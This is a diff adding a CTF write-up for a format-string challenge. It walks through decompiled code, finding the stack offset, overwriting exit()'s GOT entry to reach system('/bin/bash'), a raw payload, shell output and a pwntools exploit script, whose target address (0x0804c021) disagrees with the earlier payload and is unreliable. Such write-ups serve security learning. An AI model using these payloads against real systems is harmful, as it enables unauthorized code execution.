@@ -1026,7 +1026,7 @@ Flag: sabr{m3m0ry_c0rrup710n_iz_fUNNNNNNNNNNNN}
 
 ### fsbeZ:
 
-I don't the images cause the ctf's is over and i didn't take capture while i was doing it
+I don't have the images cause the ctf's is over and i didn't take capture while i was doing it
 
 But still I do have the binary stored in my pc
 
@@ -1081,17 +1081,267 @@ We see that it justs takes in our input then print it out back
 
 Now I then decompiled the binary using ghidra 
 
+Function FUN_08049250 
+
 ```
 
+void FUN_08049250(void)
 
+{
+  int iVar1;
+  undefined4 *puVar2;
+  int in_GS_OFFSET;
+  undefined4 local_94;
+  undefined4 local_90 [31];
+  undefined4 local_14;
+  undefined *puStack16;
+  
+  puStack16 = &stack0x00000004;
+  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
+  local_94 = 0;
+  puVar2 = local_90;
+  for (iVar1 = 0x1f; iVar1 != 0; iVar1 = iVar1 + -1) {
+    *puVar2 = 0;
+    puVar2 = puVar2 + 1;
+  }
+  setvbuf(stdin,(char *)0x0,2,0);
+  setvbuf(stdout,(char *)0x0,2,0);
+  alarm(0x3c);
+  FUN_0804921b();
+  printf("fsb: ");
+  fgets((char *)&local_94,0x80,stdin);
+  printf((char *)&local_94);
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+```
+Function FUN_080491e6
+```
 
+void FUN_080491e6(void)
 
-                                                         
+{
+  int iVar1;
+  int in_GS_OFFSET;
+  
+  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
+  system("/bin/bash");
+  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+```
 
+So the first function which is likely going to be the main takes in user input and prints it out back
 
+There's no any form of buffer overflow cause it used fget to receive user input
 
+But whereas it uses printf without specifying the format and prints out the input we give
 
+The obvious thing to do is to call the function or rather call /bin/bash
 
+But there's no buffer overflow so we can't overwrite return address to call /bin/bash but instead we can overwrite the Global Offset Table (GOT) address for exit to 
+
+call rather call /bin/bash 
+
+So what GOT does is that it stores pointers to libc function or any other external libs and therefore when a binary wants to call a function it looks into the got 
+
+entry to find the pointer to that
+
+Since PIE is not enabled and we dont have full relro we know where the got lives and we can write there
+
+Therefore when you overwirte whats in the got for exit() you can make the process jump to that pointer when exit is called
+
+And why I used want to overwrite exit() is because from the decompiled code its basically useless there instead of overwriting printf we can take advantage of the 
+
+function that doesn't really do anything useful for us
+
+Now lets get to the exploitation part
+
+Firstly we need to get the offset i.e the address where the input is being stored in the stack
+
+A fuzzing script can be used but while i tried solving it i got the offset manually
+
+By giving it this input `AAAA%1$p` but i was incrementing the value but +1
+
+So at offset 7 we see that the result being printed out is hex of A's meaning that our input is being stored at the 7th parameter on the stack
+
+```
+┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
+└─$ ./fsbeZ
+ ▄▄█████████ ▄▄█████████ ▄█████████▄ ▄▄█████████ ▄██████████
+ ████▀▀▀▀▀▀▀ ████▀▀▀▀▀▀▀ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
+ ████▄▄▄     ████▄▄▄▄▄▄  ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
+ ████▀▀▀     ▀▀▀▀▀▀▀████ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
+ ████        ▄▄▄▄▄▄▄████ ████▄▄▄████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
+ ████        ██████████▀ ██████████▀ ▀██████████ ███████████
+ ▀▀▀▀        ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀
+
+fsb: AAAA%7$p
+AAAA0x41414141
+```
+
+Now this are the steps I took in solving this challenge
+- Find the address of "/bin/bash"
+- Find the address of exit() in GOT
+- Find the offset of our string on the stack
+- Write the proper exploit string
+- Rewrite exploit using pwntools 
+
+At this moment we have the offset of our string on the stack which is 7 
+
+Now lets get the address of "/bin/bash" and exit() in GOT
+
+I used ghidra to get them 
+
+```
+        080491fa 68 08 a0        PUSH       s_/bin/bash_0804a008                             = "/bin/bash"
+                 04 08
+        080491ff e8 9c fe        CALL       <EXTERNAL>::system                               int system(char * __command)
+                 ff ff
+```
+
+Now to get the address for exit() in GOT we need to navigate to the got.plt section of the binary 
+
+```
+                             //
+                             // .got.plt 
+                             // SHT_PROGBITS  [0x804c000 - 0x804c02f]
+                             // ram:0804c000-ram:0804c02f
+                             //
+                             __DT_PLTGOT                                     XREF[2]:     0804bf80(*), 
+                                                                                          _elfSectionHeaders::0000037c(*)  
+        0804c000 14 bf 04 08     addr       _DYNAMIC
+                             PTR_0804c004                                    XREF[1]:     FUN_08049030:08049030(R)  
+        0804c004 00 00 00 00     addr       00000000
+                             PTR_0804c008                                    XREF[1]:     FUN_08049030:08049036  
+        0804c008 00 00 00 00     addr       00000000
+                             PTR___libc_start_main_0804c00c                  XREF[1]:     __libc_start_main:08049040  
+        0804c00c 00 d0 04 08     addr       <EXTERNAL>::__libc_start_main                    = ??
+                             PTR_printf_0804c010                             XREF[1]:     printf:08049050  
+        0804c010 04 d0 04 08     addr       <EXTERNAL>::printf                               = ??
+                             PTR_fgets_0804c014                              XREF[1]:     fgets:08049060  
+        0804c014 08 d0 04 08     addr       <EXTERNAL>::fgets                                = ??
+                             PTR_alarm_0804c018                              XREF[1]:     alarm:08049070  
+        0804c018 0c d0 04 08     addr       <EXTERNAL>::alarm                                = ??
+                             PTR___stack_chk_fail_0804c01c                   XREF[1]:     __stack_chk_fail:08049080  
+        0804c01c 10 d0 04 08     addr       <EXTERNAL>::__stack_chk_fail                     = ??
+                             PTR_puts_0804c020                               XREF[1]:     puts:08049090  
+        0804c020 14 d0 04 08     addr       <EXTERNAL>::puts                                 = ??
+                             PTR_system_0804c024                             XREF[1]:     system:080490a0  
+        0804c024 18 d0 04 08     addr       <EXTERNAL>::system                               = ??
+                             PTR_exit_0804c028                               XREF[1]:     exit:080490b0  
+        0804c028 20 d0 04 08     addr       <EXTERNAL>::exit                                 = ??
+                             PTR_setvbuf_0804c02c                            XREF[1]:     setvbuf:080490c0  
+        0804c02c 24 d0 04 08     addr       <EXTERNAL>::setvbuf                              = ??
+```
+
+Now we have the neccessary addresses
+- Address of shell ("/bin/bash") =  080491fa
+- Address of exit() GOT = 0804c028
+- Offset of string on stack = 7
+
+Now the payload creation:
+
+Here, we’ll write 080491fa ("/bin/bash") in two parts, the low order bytes the and the high order bytes 
+
+Those bytes should be wrote at 0804c028, the call to exit(). 
+
+Here's the resource which helped me https://axcheron.github.io/exploit-101-format-strings/
+
+I can't really explain what i don't know im sorry about that but here's what I gathered after reading it
+
+```
+run < <(python -c 'print "\x28\xc0\x04\x08%7$n"')
+
+Low order bytes = 91fa (37370 in decimal)
+High order bytes = 0804 (2052 in decimal)
+
+High order bytes = 0804 (2052 -8) = 2044
+Low order bytes = 91fa (37370 - 2052) = 35318
+
+0x0804c02a
+
+python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"'
+```
+
+So basically our final payload is `python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"'` 
+
+We can run it then output it in a file `python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"' > payload`
+
+```                                         
+┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
+└─$ python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"' > payload
+                                         
+┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
+└─$ cat payload    
+*(%2044x%7$hn%35318x%8$hn
+```
+
+Now to run it we can't do something like `./fsbeZ < payload` it won't work 
+
+So instead lets run it this way 
+```
+(cat payload; cat) | ./fsbeZ
+```
+
+Now on running the payload on the binary it gives us a bash shell xD
+
+```                                          
+┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
+└─$ (cat payload; cat) | ./fsbeZ          
+ ▄▄█████████ ▄▄█████████ ▄█████████▄ ▄▄█████████ ▄██████████
+ ████▀▀▀▀▀▀▀ ████▀▀▀▀▀▀▀ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
+ ████▄▄▄     ████▄▄▄▄▄▄  ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
+ ████▀▀▀     ▀▀▀▀▀▀▀████ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
+ ████        ▄▄▄▄▄▄▄████ ████▄▄▄████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
+ ████        ██████████▀ ██████████▀ ▀██████████ ███████████
+ ▀▀▀▀        ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀
+
+fsb: *(                                                                                                                                                                                                                                                                        
+                                                                                                                                                                                                                                  f7e1d620
+ls
+exploit.py  fsbeZ  libc.so.6  payload
+id
+uid=1000(mark) gid=1000(mark) groups=1000(mark),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),137(scanner),142(kaboxer)
+ls -al
+total 2264
+drwxr-xr-x 2 mark mark    4096 Jan 16 22:08 .
+drwxr-xr-x 8 mark mark    4096 Jan 14 13:14 ..
+-rw-r--r-- 1 mark mark     395 Jan 15 04:20 exploit.py
+-rwxr-xr-x 1 mark mark   13708 Jan 10 14:30 fsbeZ
+-rw-r--r-- 1 mark mark 2280756 Jan 10 14:26 libc.so.6
+-rw-r--r-- 1 mark mark      32 Jan 16 22:08 payload
+-rw-r--r-- 1 mark mark    1024 Jan 15 00:38 .testexploit.py.swp
+```                                                       
+
+So here's my exploit script that would also grants us shell
+
+```
+#!/usr/bin/python2
+
+from pwn import *
+
+io = process('./fsbeZ')
+#io = remote("13.36.37.184", 62000)
+
+high_bytes = 2044
+low_bytes = 35318
+
+#Convert high_bytes and low_bytes to strings
+high_bytes = str(high_bytes)
+low_bytes = str(low_bytes)
+
+#Construct the payload
+payload = p32(0x0804c021) + p32(0x0804c028) + "%" + high_bytes + "x%7$hn%" + low_bytes + "x%8$hn"
+
+io.send(payload)
+io.interactive()
+```
+
+And after running the exploit code we get shell xD 
 
 
 ### Reverse Engineering Category 
